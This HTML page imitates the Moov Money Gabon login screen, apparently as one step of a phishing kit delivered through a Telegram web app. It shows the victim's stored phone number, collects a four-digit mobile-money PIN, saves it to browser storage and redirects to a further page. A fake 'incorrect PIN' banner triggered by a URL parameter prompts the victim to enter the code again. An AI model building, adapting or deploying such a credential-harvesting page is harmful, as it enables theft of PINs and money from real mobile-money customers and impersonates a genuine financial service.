<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moov Money Gabon - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --moov-orange: #ff6600; --moov-blue: #0047ab; }
        body { background-color: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; font-family: sans-serif; }
        .header-box { width: 100%; background: linear-gradient(135deg, var(--moov-blue), #1e3a8a); padding: 30px 20px 25px; color: white; text-align: center; border-bottom: 3px solid var(--moov-orange); }
        .header-title { font-size: 32px; font-weight: 800; margin: 0; }
        .header-title .moov { color: var(--moov-orange); }
        .main-content { width: 90%; max-width: 400px; margin: 25px auto 0; text-align: center; flex-grow: 1; }
        .phone-display { width: 100%; border: 1.5px solid var(--moov-blue); border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 30px; font-weight: 700; font-size: 18px; }
        .pin-input-group { display: flex; gap: 12px; justify-content: center; margin-bottom: 25px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--moov-blue); border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
        .btn-submit { background-color: #e2e8f0; color: #94a3b8; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .btn-submit.active { background-color: var(--moov-orange); color: white; cursor: pointer; }
        .error-banner { background-color: #ffeeee; color: #dc2626; border: 1px solid #fecaca; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; display: none; }
    </style>
</head>
<body>
<div class="header-box">
    <div class="header-title"><span class="moov">Moov</span> Money</div>
</div>

<div class="main-content">
    <h2>Connexion</h2>
    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>🇬🇦</span><span>+241</span>
        <span id="displayPhone">--</span>
    </div>

    <p>Entrez votre code PIN</p>
    <div class="pin-input-group">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const errorDisplay = document.getElementById('errorDisplay');
    
    document.getElementById('displayPhone').textContent = localStorage.getItem('phone') || "065000000";

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ Code PIN incorrect, veuillez réessayer.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
    });

    loginBtn.addEventListener('click', () => {
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
});
</script>
</body>
</html>
